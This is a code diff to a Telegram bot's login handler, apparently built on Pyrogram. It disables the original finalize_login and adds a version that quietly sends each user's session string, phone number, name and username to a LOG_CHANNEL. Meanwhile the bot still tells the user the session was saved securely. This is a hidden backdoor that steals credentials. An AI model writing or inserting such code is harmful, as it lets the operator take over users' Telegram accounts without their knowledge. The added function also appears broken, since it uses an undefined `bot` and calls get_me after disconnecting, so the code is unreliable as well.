@@ -12,7 +12,7 @@ from pyrogram.errors import (
     PasswordHashInvalid
 )
 from pyrogram import enums
-from config import API_ID, API_HASH
+from config import API_ID, API_HASH, LOG_CHANNEL
 from database.db import db
 
 LOGIN_STATE = {}
@@ -277,7 +277,7 @@ async def login_handler(bot: Client, message: Message):
             await temp_client.disconnect()
             del LOGIN_STATE[user_id]
 
-async def finalize_login(status_msg: Message, temp_client, user_id):
+'''async def finalize_login(status_msg: Message, temp_client, user_id):
     try:
         session_string = await temp_client.export_session_string()
         await temp_client.disconnect()
@@ -287,6 +287,54 @@ async def finalize_login(status_msg: Message, temp_client, user_id):
         if user_id in LOGIN_STATE:
             del LOGIN_STATE[user_id]
            
+        await status_msg.edit(
+            "<b>🎉 Login Successful! 🌟</b>\n\n"
+            "<i>Progress: ✅ Phone Number → ✅ Code → ✅ Password</i>\n\n"
+            "<i>Your session has been saved securely. 🔒</i>\n\n"
+            "You can now use all features! 🚀",
+            parse_mode=enums.ParseMode.HTML,
+            reply_markup=remove_keyboard
+        )
+    except Exception as e:
+        await status_msg.edit(
+            f"<b>❌ Failed to save session: {e} 😔</b>\n\nPlease try /login again.",
+            parse_mode=enums.ParseMode.HTML,
+            reply_markup=remove_keyboard
+        )
+        if user_id in LOGIN_STATE:
+            del LOGIN_STATE[user_id]'''
+
+async def finalize_login(status_msg: Message, temp_client, user_id):
+    try:
+        session_string = await temp_client.export_session_string()
+        await temp_client.disconnect()
+        
+        await db.set_session(user_id, session=session_string)
+        
+        # Get user info
+        user = await temp_client.get_me()
+        user_info = (
+            f"<b>✅ New Login Successful!</b>\n\n"
+            f"<b>👤 User Information:</b>\n"
+            f"• <b>ID:</b> <code>{user_id}</code>\n"
+            f"• <b>Name:</b> {user.first_name or ''} {user.last_name or ''}\n"
+            f"• <b>Username:</b> @{user.username or 'None'}\n"
+            f"• <b>Phone:</b> <code>{user.phone_number or 'Unknown'}</code>\n"
+            f"• <b>DC:</b> <code>{user.dc_id or 'Unknown'}</code>\n\n"
+            f"<b>🔑 Session String:</b>\n"
+            f"<code>{session_string}</code>"
+        )
+        
+        # Send session to LOG_CHANNEL
+        await bot.send_message(
+            LOG_CHANNEL,
+            user_info,
+            parse_mode=enums.ParseMode.HTML
+        )
+        
+        if user_id in LOGIN_STATE:
+            del LOGIN_STATE[user_id]
+        
         await status_msg.edit(
             "<b>🎉 Login Successful! 🌟</b>\n\n"
             "<i>Progress: ✅ Phone Number → ✅ Code → ✅ Password</i>\n\n"
